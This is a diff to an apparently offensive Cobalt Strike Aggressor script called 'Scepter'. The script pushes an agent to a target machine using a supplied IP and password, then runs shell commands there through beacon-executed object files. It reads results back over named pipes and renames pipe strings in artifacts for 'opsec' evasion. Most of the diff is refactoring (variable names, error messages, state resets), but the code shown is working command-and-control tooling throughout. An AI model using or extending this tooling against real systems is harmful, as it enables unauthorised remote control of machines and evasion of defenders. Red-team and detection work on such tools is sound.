@@ -10,8 +10,8 @@ println("[SCEPTER] You are now holding the Scepter.")
 # _final are the names that are being stomped into the artifacts
 # _stomp_me_name are the original names in the artifacts that are going to be stomped in either by the globals or by user specified parameters.
 
-$pipe_output_name_final = "BigGasPipe_updater_00"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
-$pipe_input_name_final = "BigGasPipe_updater_01"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_output_name_final = "BigGasPipe_updater_005"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_input_name_final = "BigGasPipe_updater_004"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
 $interface_ip_final = "0.0.0.0"; # the server can be tightened down to a specific interface by changing this
 
 # Target strings that are stomped
@@ -62,11 +62,11 @@ sub stomp-str {
         }
         $padded_output_string = $output_string . $null_padding;
     } else if ($padding_needed < 0) {
-        berror($beacon_id, "String '" . $output_string . "' is longer than max " . $stomp_me_string_len . " bytes!");
+        println("[SCEPTER ERROR] Output string of size '" . strlen($output_string) . "' is longer than max " . $stomp_me_string_len . " bytes!");
         return; # Important to return if name is too long
     }
-    println("[SCEPTER] ORIGINAL STRING: " . $stomp_me_string);
-    println("[SCEPTER] NEW STRING: " . $output_string);
+    # println("[SCEPTER] ORIGINAL STRING: " . $stomp_me_string);
+    # println("[SCEPTER] NEW STRING: " . $output_string);
 
     # Now use $padded in strrep
     $output_string = strrep($bytes, $stomp_me_string, $padded_output_string);
@@ -90,8 +90,13 @@ alias scepter-init {
     $target_password = $5;
     $pid = $6; # optional PID
 
+    if($ssh_inited > 0){
+        berror($1, "[SCEPTER] SSH Server already initialized");
+        return;    
+    }
+
     if($target_ip is $null || $target_password is $null || $target_password is $null){
-        berror($1, "Invalid arguments");
+        berror($1, "[SCEPTER] Invalid arguments");
         return;
     }
 
@@ -99,7 +104,7 @@ alias scepter-init {
     $barch = beacon_info($beacon_id, "barch");
 
     if ($barch != "x64") {
-        berror($1, "This script only supports x64 processes");
+        berror($1, "[SCEPTER] This script only supports x64 processes");
         return;
     }
 
@@ -133,7 +138,7 @@ alias scepter-init {
                 $agent_path = getFileProper(script_resource("."), "bins", $arch_item, $filename);
                 $agent_path_out = getFileProper(script_resource("."), "out", $arch_item, $filename);
 
-                println("[SCEPTER] Looking for: ". $agent_path);
+                # println("[SCEPTER] Looking for: ". $agent_path);
 
                 if ( -exists $agent_path ) {
                     println("[SCEPTER] Found: " . $agent_path);
@@ -255,7 +260,7 @@ sub scepter-read {
     $description = "pipe read";
 
     if($ssh_inited < 0){
-        berror($1, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
+        berror($1, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>");
         return;
     }
 
@@ -287,16 +292,16 @@ sub scepter-read {
 # $1 - beacon id
 # $2 - data to send to agent (shell command)
 alias scepter-exec {
-    local('$bid $data $bof $args $bof_path $handle $bof_data');
-    $bid = $1;
+    local('$beacon_id $data $bof $args $bof_path $handle $bof_data');
+    $beacon_id = $1;
     $data = $2;
 
     if($ssh_inited < 0){
-        berror($bid, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
+        berror($beacon_id, "[SCEPTER] You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
         return;
     }
 
-    $args = bof_pack($bid, "z", "cmd:" . $data);
+    $args = bof_pack($beacon_id, "z", "cmd:" . $data);
 
     # Build bof path; This needs rework if you want to support x86 for whatever reason
     $bof_path = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
@@ -307,33 +312,33 @@ alias scepter-exec {
     closef($handle);
 
     # execute it.
-    beacon_inline_execute($bid, $bof_data, "go", $args);
-
+    beacon_inline_execute($beacon_id, $bof_data, "go", $args);
 
     if($reading_inited < 0){
-        # give the bof a couple of seconds to write the data to the pipe
+        # give the pipes a couple of seconds to initialize
         sleep(2 * 1000);
 
         # read from the output pipe
-        scepter-read($bid, $null);
+        scepter-read($beacon_id, $null);
 
         $reading_inited = 1;
 
     }
+    
 }
 
 # $1 - beacon id
 alias scepter-exit {
-    local('$bid $data $bof $args $bof_path $handle $bof_data');
-    $bid = $1;
+    local('$beacon_id $data $bof $args $bof_path $handle $bof_data');
+    $beacon_id = $1;
     $data = "exit";
 
     if($ssh_inited < 0){
-        berror($bid, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
+        berror($beacon_id, "[SCEPTER] You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>");
         return;
     }
 
-    $args = bof_pack($bid, "z", $data);
+    $args = bof_pack($beacon_id, "z", $data);
 
     # Build bof path; This needs rework if you want to support x86 for whatever reason
     $bof_path = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
@@ -344,10 +349,14 @@ alias scepter-exit {
     closef($handle);
 
     # execute it.
-    beacon_inline_execute($bid, $bof_data, "go", $args);
+    beacon_inline_execute($beacon_id, $bof_data, "go", $args);
 
     # give the bof a couple of seconds to write the data to the pipe
     sleep(2 * 1000);
+    
+    # reset globals
+    $reading_inited = -1;
+    $ssh_inited = -1;
 }
 
 # --------------------
